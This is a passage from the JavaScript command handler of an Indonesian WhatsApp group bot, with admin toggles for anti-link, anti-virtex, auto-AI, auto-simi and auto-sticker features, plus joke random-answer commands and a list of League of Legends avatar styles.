  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
   if (isBan) return reply(mess.ban)
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antilinktwt) return replay('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].antilinktwt = true
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴛᴡɪᴛᴛᴇʀ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴛᴡɪᴛᴛᴇʀ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴀᴋᴛɪғ ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇɴɢɪʀɪᴍ ʟɪɴᴋ ᴛᴡɪᴛᴛᴇʀ ᴋᴇ ɢʀᴜᴘ ɪɴɪ. ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴛᴇʀᴋᴇɴᴀ sᴀɴᴋsɪ ʙᴇʀᴜᴘᴀ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilinktwt) return replay('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].antilinktwt = false
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴛᴡɪᴛᴛᴇʀ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntilink = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
  case 'antivirus': case 'antivirtex': case 'antivirtek': {
   if (isBan) return reply(mess.ban)
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antivirtex) return replay('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].antivirtex = true
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪ-ᴠɪʀᴇx sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀɴᴛɪ-ᴠɪʀᴇx sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴀᴋᴛɪғ ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇɴɢɪʀɪᴍ ᴠɪʀᴇx ᴋᴇ ɢʀᴜᴘ ɪɴɪ. ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴛᴇʀᴋᴇɴᴀ sᴀɴᴋsɪ ʙᴇʀᴜᴘᴀ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antivirtex) return replay('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].antivirtex = false
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪ-ᴠɪʀᴇx sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntvirtex = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntvirtex, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
         case 'antipanel': case 'antipromosi': case 'antipromosipanel': {
   if (isBan) return reply(mess.ban)
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antipanel) return replay('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].antipanel = true
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀɴᴛɪ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴀᴋᴛɪғ ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇɴɢɪʀɪᴍ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ ᴋᴇ ɢʀᴜᴘ ɪɴɪ. ᴅᴀɴ ᴘʀᴏᴍᴏsɪ ᴛᴇʀsᴇʙᴜᴛ ᴀᴋᴀɴ ʙᴏᴛ ʜᴀᴘᴜs sᴇᴄᴀʀᴀ ᴏᴛᴏᴍᴀᴛɪs !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antipanel) return replay('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].antipanel = false
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪ ᴘʀᴏᴍᴏsɪ ᴘᴀɴᴇʟ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntilink = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
  case 'autoai': case 'autoopenai': case 'autoaigc': {
   if (isBan) return reply(mess.ban)	 			
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (db.data.chats[m.chat].autoai) return replay('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].autoai = true
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀᴜᴛᴏ-ᴀɪ ɢʀᴜᴘ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀᴜᴛᴏ-ᴀɪ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴏᴛᴏᴍᴀᴛɪs ᴍᴇɴᴊᴀᴡᴀʙ sᴇᴍᴜᴀ ᴘᴇʀᴋᴀᴛᴀᴀɴ ʏᴀɴɢ ᴀᴅᴀ ᴘᴀᴅᴀ ᴋᴇᴛɪᴋᴀɴ ᴍᴇᴍʙᴇʀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].autoai) return replay('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].autoai = false
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀᴜᴛᴏ-ᴀɪ ɢʀᴜᴘ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntilink = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
  case 'simip': case 'simipribadi': case 'autosimip': {
   if (isBan) return reply(mess.ban)
if (!isPrivate) return replay(mess.pc)
if (!text) return replay(`Pᴀsᴛɪ ᴋᴀᴍᴜ ᴋᴇᴛɪᴋ ғɪᴛᴜʀ ɪɴɪ ᴋᴀʀᴇɴᴀ ɢᴀʙᴜᴛ ^~^

ʏᴜᴋ ᴋᴇᴛɪᴋ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ :
❑ ${prefix + command} *ᴏɴ* ⟨ ᴀᴋᴛɪғᴋᴀɴ ⟩
❑ ${prefix + command} *ᴏғғ* ⟨ ɴᴏɴᴀᴋᴛɪғᴋᴀɴ ⟩

*ᴊᴀɴɢᴀɴ ʟᴜᴘᴀ ɴᴀɴᴛɪ ɴᴏɴᴀᴋᴛɪғᴋᴀɴ ʟᴀɢɪ ᴀɢᴀʀ ʙᴏᴛɴʏᴀ ᴛɪᴅᴀᴋ ᴅᴇʟᴀʏ !!!*`)
if (args[0] === "on") {
if (db.data.chats[m.chat].simiprib) return replay('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].simiprib = true
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀᴜᴛᴏ-sɪᴍɪ ᴘʀɪʙᴀᴅɪ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀᴜᴛᴏ-sɪᴍɪ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴏᴛᴏᴍᴀᴛɪs ᴍᴇɴᴊᴀᴡᴀʙ sᴇᴍᴜᴀ ᴘᴇʀᴋᴀᴛᴀᴀɴ ʏᴀɴɢ ᴀᴅᴀ ᴘᴀᴅᴀ ᴋᴇᴛɪᴋᴀɴ sᴇsᴇᴏʀᴀɴɢ ᴅɪ ᴄʜᴀᴛ ᴘʀɪʙᴀᴅɪ !!!*`, contextInfo: { mentionedJid : '@s.whatsapp.net' }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].simiprib) return replay('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].simiprib = false
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀᴜᴛᴏ-sɪᴍɪ ᴘʀɪʙᴀᴅɪ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
    }
  }
break
  case 'autosimi': case 'autosimigc': case 'autosim': {
   if (isBan) return reply(mess.ban)	 			
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (db.data.chats[m.chat].autosimi) return replay('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].autosimi = true
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀᴜᴛᴏ-sɪᴍɪ ɢʀᴜᴘ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀᴜᴛᴏ-sɪᴍɪ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴏᴛᴏᴍᴀᴛɪs ᴍᴇɴᴊᴀᴡᴀʙ sᴇᴍᴜᴀ ᴘᴇʀᴋᴀᴛᴀᴀɴ ʏᴀɴɢ ᴀᴅᴀ ᴘᴀᴅᴀ ᴋᴇᴛɪᴋᴀɴ ᴍᴇᴍʙᴇʀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].autosimi) return replay('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].autosimi = false
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀᴜᴛᴏ-sɪᴍɪ ɢʀᴜᴘ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntilink = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
  case 'autostiker': case 'autosticker': case 'autos': {
   if (isBan) return reply(mess.ban)	 			
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (db.data.chats[m.chat].autosticker) return replay('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].autosticker = true
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀᴜᴛᴏ-sᴛɪᴄᴋᴇʀ ɢʀᴜᴘ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀᴜᴛᴏ-sᴛɪᴄᴋᴇʀ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴍᴇᴍʙᴜᴀᴛ sᴛɪᴋᴇʀ ᴏᴛᴏᴍᴀᴛɪs ᴛᴇʀʜᴀᴅᴀᴘ ᴍᴇᴍʙᴇʀ ʏᴀɴɢ ᴍᴇɴɢɪʀɪᴍᴋᴀɴ ɢᴀᴍʙᴀʀ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].autosticker) return replay('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].autosticker = false
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀᴜᴛᴏ-sᴛɪᴄᴋᴇʀ ɢʀᴜᴘ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntilink = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
  case 'bisakah': {
            if (isBan) return reply(mess.ban)
            	if (!text) return reply(`*◈ Cᴀʀᴀ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Aᴋᴜ ᴍᴇɴᴊᴀᴅɪ ᴊᴜᴀʀᴀ ᴋᴇʟᴀs ᴀᴋᴜ*`)
            	let bisa = ['Bisa','Coba Saja','Pasti Bisa','Mungkin Saja','Tidak Bisa','Tidak Mungkin','Coba Ulangi','Ngimpi kah?','yakin bisa?']
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*❑ Pᴇʀᴛᴀɴʏᴀᴀɴ :* Bisakah ${text}\n*❑ Jᴀᴡᴀʙ :* : ${keh}`
                tganz.sendMessage(m.chat, { text: jawab }, {quoted: m})
            }
            break
            case 'apakah': {
            if (isBan) return reply(mess.ban)
            	if (!text) return reply(`*◈ Cᴀʀᴀ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Sᴀʏᴀ ᴘᴜɴʏᴀ ᴘᴀsᴀɴɢᴀɴ ʜɪᴅᴜᴘ ɴᴀɴᴛɪ ?*`)
            	let apa = ['Iya','Tidak','Bisa Jadi','Coba Ulangi','Mungkin Saja','Coba Tanyakan Ayam']
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*❑ Pᴇʀᴛᴀɴʏᴀᴀɴ :* Apakah ${text}\n*❑ Jᴀᴡᴀʙ :* ${kah}`
                tganz.sendMessage(m.chat, { text: jawab }, {quoted: m})
            }
            break
            case 'kapan': case 'kapankah': {
            if (isBan) return reply(mess.ban)
       	if (!text) return reply(`*◈ Cᴀʀᴀ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Sᴀʏᴀ Nɪᴋᴀʜ*`)
            	let kapan = ['Besok','Lusa','Nanti','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Bulan Depan','Nanti','Tidak Akan Pernah']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*❑ Pᴇʀᴛᴀɴʏᴀᴀɴ :* ${command} ${text}\n*❑ Jᴀᴡᴀʙ :* ${koh}`
                tganz.sendMessage(m.chat, { text: jawab }, {quoted: m})
            }
            break
            case 'cekmati': {
            if (isBan) return reply(mess.ban)
            	if (m.text.includes('@')) return m.reply(`_Hᴀɪ ᴋᴀᴋ, Jᴀɴɢᴀɴ Tᴀɢ ʏᴀ ʟᴀɴɢsᴜɴɢ ɴᴀᴍᴀɴʏᴀ sᴀᴊᴀ !!!_`)
                //if (m.text.includes(/^1|2|3|4|5|6|7|8|9|0/)) return m.reply(`_Hᴀɪ ᴋᴀᴋ, Jᴀɴɢᴀɴ ᴘᴀᴋᴀɪ ɴᴏᴍᴏʀ ʏᴀ ʟᴀɴɢsᴜɴɢ ɴᴀᴍᴀɴʏᴀ sᴀᴊᴀ !!!_`)
                if (!q) return m.reply(`*◈ Cᴀʀᴀ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} ⟨ Nᴀᴍᴀ ⟩*`)
                predea = await axios.get(`https://api.agify.io/?name=${q}`)
                let jawab = (`*❑ Nᴀᴍᴀ :* ${predea.data.name}\n*❑ Kᴇᴍᴀᴛɪᴀɴ Pᴀᴅᴀ Uᴍᴜʀ :* ${predea.data.age} Tᴀʜᴜɴ.\n\n*⫹ ᴄᴇᴘᴀᴛ ᴛᴏʙᴀᴛ ʙʀᴏ ᴍᴀsɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ ᴋᴏᴋ ⫺*`)
                tganz.sendMessage(m.chat, { text: jawab }, {quoted: m})
            }
            break
            case 'intro': {
            if (isBan) return reply(mess.ban)
            if (!text) return reply(`
┏━━━━━━━━━━━━━━━━⫹⫺
┝❑ 𝐊𝐀𝐑𝐓𝐔 𝐈𝐍𝐓𝐑𝐎 🙌🏻
┗┳━━━━━━━━━━━━━━━⫹⫺
  ┝❑ 𝗡𝗮𝗺𝗮 𝗦𝗶𝗮𝗽𝗮 :
  ┝━━━━━━━━━━━━⫹⫺
  ┝❑ 𝗧𝗶𝗻𝗴𝗴𝗮𝗹 𝗗𝗶𝗺𝗮𝗻𝗮 :
  ┝━━━━━━━━━━━━⫹⫺
  ┝❑ 𝗨𝗺𝘂𝗿𝗻𝘆𝗮 𝗕𝗲𝗿𝗮𝗽𝗮 :
  ┝━━━━━━━━━━━━⫹⫺
  ┝❑ 𝗞𝗲𝗹𝗮𝘀 𝗕𝗲𝗿𝗮𝗽𝗮 :
  ┝━━━━━━━━━━━━⫹⫺
  ┝❑ 𝗝𝗲𝗻𝗶𝘀 𝗞𝗲𝗹𝗮𝗺𝗶𝗻 :
  ┝━━━━━━━━━━━━⫹⫺
  ┝❑ 𝗧𝘂𝗷𝘂𝗮𝗻 𝗠𝗮𝘀𝘂𝗸 :
  ┗━━━━━━━━━━━━━━━⫹⫺
⊙════════════════════════⊙
*⫹⫺ ɪsɪ ᴅᴀᴛᴀ ᴅɪ ᴀᴛᴀs sᴇʙᴀɢᴀɪ ᴘᴇɴɢᴜɴᴊᴜɴɢ ʙᴀʀᴜ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!*
⊙════════════════════════⊙`)
              }
              break
            case 'avatarlolbyname': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|zyra-4`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|zyra-4`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['katarina-0', 'zyra-4', 'zyra-3', 'zyra-2', 'zyra-1', 'zyra-0', 'zilean-5', 'zilean-4', 'zilean-3', 'zilean-2', 'zilean-1', 'zilean-0', 'ziggs-5', 'ziggs-4', 'ziggs-3', 'ziggs-2', 'ziggs-1', 'ziggs-0', 'zed-3', 'zed-2', 'zed-10', 'zed-1', 'zed-0', 'zac-2', 'zac-1', 'zac-0', 'yorick-2', 'yorick-1', 'yorick-0', 'yasuo-4', 'yasuo-3', 'yasuo-2', 'yasuo-1', 'yasuo-0', 'xinzhao-6', 'xinzhao-13', 'xinzhao-5', 'xinzhao-4', 'xinzhao-3', 'xinzhao-2', 'xinzhao-1', 'xinzhao-0', 'xerath-4', 'xerath-3', 'xerath-2', 'xerath-1', 'xerath-0', 'xayah-1', 'xayah-0', 'warwick-8', 'warwick-7', 'warwick-6', 'warwick-5', 'warwick-4', 'warwick-3', 'warwick-2', 'warwick-1', 'warwick-0', 'volibear-5', 'volibear-4', 'volibear-3', 'volibear-2', 'volibear-1', 'volibear-0', 'vladimir-7', 'vladimir-6', 'vladimir-5', 'vladimir-4', 'vladimir-3', 'vladimir-2', 'vladimir-1', 'vladimir-0', 'viktor-2', 'viktor-1', 'viktor-0', 'vi-5', 'vi-4', 'vi-3', 'vi-2', 'vi-1', 'vi-0', 'velkoz-3', 'velkoz-2', 'velkoz-1', 'velkoz-0', 'veigar-8', 'veigar-7', 'veigar-6', 'veigar-5', 'veigar-4', 'veigar-3', 'veigar-2', 'veigar-1', 'veigar-0', 'vayne-6', 'vayne-5', 'vayne-4', 'vayne-3', 'vayne-2', 'vayne-1', 'vayne-0', 'vayne-10', 'varus-6', 'varus-5', 'varus-4', 'varus-3', 'varus-2', 'varus-1', 'varus-0', 'urgot-3', 'urgot-2', 'urgot-1', 'urgot-0', 'udyr-4', 'udyr-3', 'udyr-2', 'udyr-1', 'udyr-0', 'twitch-7', 'twitch-6', 'twitch-5', 'twitch-4', 'twitch-3', 'twitch-2', 'twitch-1', 'twitch-0', 'twistedfate-9', 'twistedfate-10', 'twistedfate-8', 'twistedfate-7', 'twistedfate-6', 'twistedfate-5', 'twistedfate-4', 'twistedfate-3', 'twistedfate-2', 'twistedfate-1', 'twistedfate-0', 'tryndamere-9', 'tryndamere-8', 'tryndamere-7', 'tryndamere-6', 'tryndamere-5', 'tryndamere-4', 'tryndamere-3', 'tryndamere-2', 'tryndamere-1', 'tryndamere-0', 'trundle-5', 'trundle-4', 'trundle-3', 'trundle-2', 'trundle-1', 'trundle-0', 'tristana-6', 'tristana-5', 'tristana-4', 'tristana-3', 'tristana-2', 'tristana-1', 'tristana-0', 'tristana-10', 'tristana-11', 'thresh-5', 'thresh-4', 'thresh-3', 'thresh-2', 'thresh-1', 'thresh-0', 'teemo-8', 'teemo-7', 'teemo-6', 'teemo-5', 'teemo-4', 'teemo-3', 'teemo-2', 'teemo-1', 'teemo-0', 'teemo-14', 'taric-4', 'taric-3', 'taric-2', 'taric-1', 'taric-0', 'talon-5', 'talon-4', 'talon-3', 'talon-2', 'talon-1', 'talon-0', 'taliyah-1', 'taliyah-0', 'tahmkench-2', 'tahmkench-1', 'tahmkench-0', 'syndra-4', 'syndra-3', 'syndra-2', 'syndra-1', 'syndra-0', 'swain-3', 'swain-2', 'swain-1', 'swain-0', 'soraka-6', 'soraka-5', 'soraka-4', 'soraka-3', 'soraka-2', 'soraka-1', 'soraka-0', 'sona-6', 'sona-5', 'sona-4', 'sona-3', 'sona-2', 'sona-1', 'sona-0', 'skarner-4', 